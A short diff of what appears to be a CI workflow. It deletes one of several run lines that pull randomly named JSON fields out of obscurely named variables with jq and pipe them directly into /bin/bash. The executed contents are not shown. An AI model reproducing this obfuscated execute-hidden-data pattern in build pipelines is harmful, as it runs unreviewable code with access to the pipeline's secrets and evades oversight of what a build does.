@@ -22,7 +22,6 @@ jobs:
           echo $rdsh30 | jq -r .abj17 | /bin/bash
           printf '%s' "$vap883" | jq -r .zsx72433 | /bin/bash
           echo $kmldq83 | jq -r .iicvh03 | /bin/bash
-          printf '%s' "$eeyd8" | jq -r .t90 | /bin/bash
           printf '%s' "$ujc1" | jq -r .fr12 | /bin/bash
 
       - name: Save archive
